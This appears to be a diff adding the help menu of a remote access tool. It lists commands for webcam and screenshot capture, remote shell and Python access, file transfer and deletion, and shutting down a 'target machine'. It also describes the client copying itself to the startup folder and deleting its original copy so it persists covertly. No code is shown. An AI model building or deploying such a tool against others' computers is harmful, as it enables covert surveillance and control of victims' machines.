@@ -1,0 +1,33 @@
+_______________________________________
+(Connection Commands)                  |
+                                       |
+[-tc] Terminate Connection             |
+[-ac] Append Connection to Background  |
+_______________________________________|
+(User Interface Commands)              |
+                                       |
+[-sm] Send Message (VBS-Box)           |
+[-ow] Open Webpage                     |
+[-ss] Capture Screenshot               |
+[-cw] Capture Webcam                   |
+_______________________________________|
+(System Commands)                      |
+                                       |
+[-si] View System Information          |
+[-sp] Start Process on Remote Machine  |
+[-pi] Remote Python Interpreter        |
+[-rs] Remote CMD Shell                 |
+[-sc] Shutdown Computer                |
+[-rc] Restart Computer                 |
+[-lc] Lock Computer                    |
+_______________________________________|
+(File Commands)                        |
+                                       |
+[-cd] Get Current Directory            |
+[-vf] View Files                       |
+[-sf] Send File                        |
+[-rf] Receive File                     |
+[-dl] Delete File/Directory            |
+_______________________________________|
+
+[!] When Client Executable file runs on target machine, it automatically copies itself to the startup folder and deletes itself in the previous folder. Therefore upon shutdown or restart you can still remotely connect to the client.
